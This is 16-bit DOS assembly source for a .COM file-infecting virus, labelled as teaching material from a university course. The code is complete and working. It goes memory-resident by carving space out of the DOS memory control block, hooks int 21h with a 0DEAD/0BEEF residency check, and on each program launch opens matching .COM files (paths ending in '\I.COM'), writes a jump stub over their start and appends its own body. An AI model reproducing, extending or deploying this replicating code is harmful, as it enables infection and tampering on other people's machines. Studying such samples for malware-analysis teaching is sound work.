comment #
This virus program is for teaching purpose only, 
everyone who has downloaded this program at ZJU
is not allowed to upload this program to internet.
                         Written by Black White
                         iceman@zju.edu.cn
                         June 9, 2021.
#

.386
code segment use16
assume cs:code, ds:code
;cs=psp, ip=100h for .com program
main:
   push cs
   mov ax, cs
   add ax, 10h  ; paragraph len of psp
   add ax, 0001h; current program's paragraph len
   push ax
   mov ax, offset virus
                ; skip 30h buffer holding old com's head+virus's head+virus's var
   push ax
   retf
   int 3h
code ends

virus_seg segment use16
assume cs:virus_seg, ds:virus_seg
old_com_head:
   mov ax, 0003h
   int 10h
   mov ah, 4Ch
   int 21h
   db 7 dup(90h)
virus_head:
   push cs
   mov ax, cs
   add ax, 10h  ; paragraph len of psp + 1 paragraph for virus_head
old_com_para_len = $ + 1
   add ax, 0000h; current program's paragraph len
   push ax
   mov ax, offset virus_seg:virus
                ; skip 30h buffer holding old com's head+virus's head+virus's var
   push ax
   retf
   int 3h
psp dw 0
virus_len dw 0
old_21h dw 0, 0
old_com_len dw 0
buf db 6 dup(0)
;new ip=30h
virus:
   pop es      ; es=psp
   push cs
   pop ds      ; ds=cs
   mov [psp],es; save psp
   ;
   mov di, 100h; es:di->main
   mov si, 0   ; ds:si->old_com_head
   mov cx, 10h ; old_com_head len
   rep movsb
   ;
   mov ax, 0DEADh
   int 21h; check whether int 21h was hooked by this virus
   cmp ax, 0BEEFh
   jne int_21h_was_not_hooked
int_21h_was_hooked:
   push es
   pop ds
   push es
   mov di, 100h
   push di
   retf; ==> main
int_21h_was_not_hooked:
   mov ax, es
   dec ax
   mov es, ax; es:0 ->memory control block
             ; es:0->5A, bb, aa, yy, xx
             ; aabb is psp, xxyy is the para size of memory allocated for current program
   mov cx, offset end_flag - offset old_com_head
   mov [virus_len], cx; virus_len
   add cx, 0Fh
   shr cx, 4       ; cx = virus_para_len
   sub word ptr es:[3], cx  ; this_blk_size -= cx
   sub word ptr es:[12h], cx; es:[12h] = final_blk_seg
   mov es, es:[12h]; es=final_blk_seg
   xor di, di
   mov si, 0
   mov cx, [virus_len]
   rep movsb; copy virus to final_blk
   push es
   mov di, offset there
   push di
   retf     ; ==> final_blk_seg:there
there:
   push cs
   pop ds
   xor ax, ax
   mov es, ax
   mov bx, 21h*4
   mov ax, es:[bx]
   mov dx, es:[bx+2]
   mov old_21h[0], ax; save int 21h's vector
   mov old_21h[2], dx;
   cli
   mov word ptr es:[bx], offset int_21h
   mov es:[bx+2], cs ; change int 21h's vector
   sti
   mov ax, [psp]
   mov es, ax
   mov ds, ax
   mov ax, 100h
   push ds
   push ax
   retf; ==> main
int_21h:
   cmp ax, 0DEADh
   jne may_be_4B00h
is_dead:
   mov ax, 0BEEFh
   iret
may_be_4B00h:
   cmp ax, 4B00h
   jne goto_old_21h
is_4B00h:
   pusha
   push ds
   push es
   ;
   push ds
   pop es
   mov di, dx
   mov al, 0
   mov cx, 0FFFFh
   repne scasb
   dec di; es:di -> '\0'
   cmp dword ptr es:[di-4], 4D4F432Eh; ".COM"
   jne skip
is_com:
   cmp dword ptr es:[di-6], 432E495Ch; "\I.COM"
   jne skip
infect_it:
   mov ax, 3D02h
   pushf
   call dword ptr cs:[old_21h]
   jc skip
   mov bx, ax; bx=handle
   push cs
   pop ds
   mov ax, 4202h
   xor cx, cx
   xor dx, dx
   pushf
   call dword ptr cs:[old_21h]
   ;int 21h; dx:ax=file len   
   mov [old_com_len], ax; discard dx, since com's len does not exceed 64K
   mov ax, 4200h
   xor cx, cx
   xor dx, dx
   pushf
   call dword ptr cs:[old_21h]
   ;int 21h
   mov ah, 3Fh
   mov cx, 10h
   mov dx, offset old_com_head
   pushf
   call dword ptr cs:[old_21h]
   ;int 21h    ; backup old com's first 0Fh bytes
   cmp ax, 10h
   jae was_it_infected
com_len_is_less_than_10h_bytes:
   mov [old_com_len], 10h
   jmp not_infected
was_it_infected:
   cmp word ptr old_com_head[0Eh], 0CCCBh; retf, int 3
   je has_been_infected
not_infected:
   mov ax, 4200h
   xor cx, cx
   xor dx, dx
   pushf
   call dword ptr cs:[old_21h]
   ;int 21h
   mov cx, old_com_len
   add cx, 0Fh
   and cx, 0FFF0h
   push cx
   shr cx, 4
   mov word ptr ds:[old_com_para_len], cx; update old_com_para_len
   mov ah, 40h
   mov dx, offset virus_head
   mov cx, 10h
   pushf
   call dword ptr cs:[old_21h]
   ;int 21h; write virus_head
   pop cx
   sub cx, old_com_len; cx=tail bytes to fill
   push cx
   mov ax, 4202h
   xor cx, cx
   xor dx, dx
   pushf
   call dword ptr cs:[old_21h]
   ;int 21h
   mov ah, 40h
   mov dx, offset buf; useless
   pop cx
   pushf
   call dword ptr cs:[old_21h]
   ;int 21h
   mov ah, 40h
   mov dx, offset old_com_head
   mov cx, offset end_flag - offset old_com_head
   pushf
   call dword ptr cs:[old_21h]
   ;int 21h; write virus
has_been_infected:
   mov ah, 3Eh
   pushf
   call dword ptr cs:[old_21h]
   ;int 21h   
skip:
   pop es
   pop ds
   popa
goto_old_21h:
   jmp dword ptr cs:[old_21h]
end_flag label byte
virus_seg ends
end
